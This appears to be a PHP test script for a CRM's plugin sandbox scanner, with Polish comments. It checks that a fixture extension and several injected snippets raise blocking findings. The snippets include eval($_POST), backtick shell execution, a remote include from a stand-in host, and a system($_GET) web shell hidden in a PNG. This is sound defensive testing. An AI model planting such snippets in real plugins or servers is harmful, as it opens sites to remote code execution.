<?php
declare(strict_types=1);
if (PHP_SAPI !== 'cli') { http_response_code(404); exit; }

// Skaner kodu sandboxu wtyczek (docker/sandbox/scan.php): złośliwa wtyczka testowa ma blokujące znaleziska,
// wbudowane integracje i przykładowe rozszerzenie - żadnego. Pełny przebieg w Dockerze: plugin-sandbox.yml.
$root = dirname(__DIR__);
$checks = 0;
function verify(bool $ok, string $name): void {
    global $checks;
    if (!$ok) { throw new RuntimeException('FAIL: ' . $name); }
    ++$checks; echo 'OK: ' . $name . "\n";
}
function scan(string $dir): array {
    global $root;
    $out = shell_exec(escapeshellarg(PHP_BINARY) . ' ' . escapeshellarg("$root/docker/sandbox/scan.php") . ' ' . escapeshellarg($dir));
    $r = json_decode((string) $out, true);
    if (!is_array($r)) { throw new RuntimeException("Skan {$dir} nie zwrócił JSON: {$out}"); }
    return $r;
}
function messages(array $r, string $level): string {
    return implode("\n", array_map(static fn($f) => $f['message'], array_filter($r['findings'], static fn($f) => $f['level'] === $level)));
}

$bad = scan("$root/tests/fixtures/sandbox/zlodziej");
verify($bad['kind'] === 'extension', 'Fixture recognised as extension');
$crit = messages($bad, 'critical');
verify(str_contains($crit, 'SecretStore'), 'Extension decrypting secrets is blocking');
verify(str_contains($crit, '.env'), 'Reading .env from an extension is blocking');
verify(str_contains($crit, 'public/'), 'Writing into application code is blocking');
verify(str_contains($crit, 'ciasteczek'), 'Reading panel cookies in JS is blocking');
verify(str_contains(messages($bad, 'review'), 'curl_init'), 'Network call needs review');
verify(in_array('zbieracz-danych.example', $bad['hosts'], true), 'Hosts in code are listed');

foreach (array_merge(glob("$root/integrations/*/register.php") ?: [], ["$root/examples/extensions/przyklad/register.php"]) as $reg) {
    $r = scan(dirname($reg));
    verify($r['counts']['critical'] === 0, 'No blocking findings in ' . basename(dirname($reg)) . ($r['counts']['critical'] ? ': ' . messages($r, 'critical') : ''));
}

// Typowe sztuczki, każda osobno.
$tmp = sys_get_temp_dir() . '/crm-scan-' . bin2hex(random_bytes(4));
mkdir("$tmp/ext/assets", 0700, true);
file_put_contents("$tmp/ext/register.php", "<?php return \\PaseExt\\Ext\\E::class;\n");
$cases = [
    'shell'      => ['<?php $o = `id`;', 'Odwrócone apostrofy'],
    'eval'       => ['<?php eval($_POST["x"]);', 'eval()'],
    'concat'     => ['<?php $f = "sys" . "tem"; $f("id");', 'zapisana jako tekst'],
    'remote'     => ['<?php include "http://zly.example/x.php";', 'adresu sieciowego'],
    'halt'       => ["<?php __halt_compiler();\nDANE", '__halt_compiler'],
];
foreach ($cases as $name => [$code, $expect]) {
    file_put_contents("$tmp/ext/E.php", $code);
    verify(str_contains(messages(scan("$tmp/ext"), 'critical'), $expect), "Blocking: {$name}");
}
file_put_contents("$tmp/ext/E.php", '<?php // ok');
file_put_contents("$tmp/ext/assets/logo.png", "\x89PNG<?php system(\$_GET['c']);");
verify(str_contains(messages(scan("$tmp/ext"), 'critical'), 'ukryty w pliku'), 'Blocking: PHP hidden in image');
unlink("$tmp/ext/assets/logo.png");
file_put_contents("$tmp/ext/.htaccess", "Require all granted\n");
verify(str_contains(messages(scan("$tmp/ext"), 'critical'), 'konfiguracji serwera'), 'Blocking: .htaccess in package');
foreach (['E.php', 'register.php', '.htaccess'] as $f) { unlink("$tmp/ext/$f"); }
rmdir("$tmp/ext/assets"); rmdir("$tmp/ext"); rmdir($tmp);

echo "Plugin sandbox scan checks passed: {$checks}\n";
